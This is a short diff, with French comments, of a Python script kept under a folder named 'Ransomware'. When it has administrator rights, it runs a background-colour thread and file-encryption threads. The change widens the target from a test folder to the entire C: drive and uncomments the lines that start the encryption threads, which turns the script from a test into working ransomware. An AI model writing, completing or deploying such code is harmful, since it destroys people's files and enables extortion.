@@ -66,14 +66,13 @@ if is_admin(): # Si l'utilisateur est administrateur
     
     # Threads
     set_background_color = threading.Thread(target=SetBackgroundColor)
-    paths = [f"D:/{getpass.getuser()}/Documents/Python Scripts/Ransomware/test lolo"]
+    paths = ["C:"]
     threads = [set_background_color] # Liste des threads
     # Pour chaque chemin dans la liste charger la fonction de cryptage avec le chemin spécifié
     for path in paths: print(path),  threads.append(threading.Thread(target=crypting.CryptFiles, args=(path,)))
     print(threads)
-    """for thread in threads: thread.start()
-    for thread in threads: thread.join()"""
-    print("CA CRYPT MON REUF")
+    for thread in threads: thread.start()
+    for thread in threads: thread.join()
     
     
 else: # Sinon relancer le launcher en administrateur
